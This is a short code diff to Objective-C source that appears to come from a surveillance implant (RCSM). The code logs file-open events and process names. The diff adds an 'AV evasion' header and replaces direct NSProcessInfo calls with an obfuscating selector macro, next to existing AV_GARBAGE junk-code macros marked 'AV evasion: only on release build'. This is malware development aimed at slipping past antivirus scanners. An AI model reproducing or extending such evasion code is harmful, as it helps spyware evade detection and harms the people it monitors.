@@ -12,6 +12,7 @@
 #import "RCSMLogger.h"
 #import "RCSMDebug.h"
 
+#import "NSProcessInfo+NSProcessInfo__AVEvasion_.h"
 #import "RCSMAVGarbage.h"
 
 typedef struct _fileConfiguration {
@@ -382,7 +383,7 @@ BOOL needToLogEntry(NSString *entry)
     // AV evasion: only on release build
     AV_GARBAGE_003
     
-    NSProcessInfo *processInfo  = [NSProcessInfo processInfo];
+    NSProcessInfo *processInfo  = [NSProcessInfo PROCESSINFO_SEL];
     
     // AV evasion: only on release build
     AV_GARBAGE_005
@@ -605,7 +606,7 @@ void logFileOpen(NSString *filePath)
   // AV evasion: only on release build
   AV_GARBAGE_008
   
-  NSProcessInfo *processInfo  = [NSProcessInfo processInfo];
+  NSProcessInfo *processInfo  = [NSProcessInfo PROCESSINFO_SEL];
   NSString *_processName      = [[processInfo processName] copy];
   
   // AV evasion: only on release build
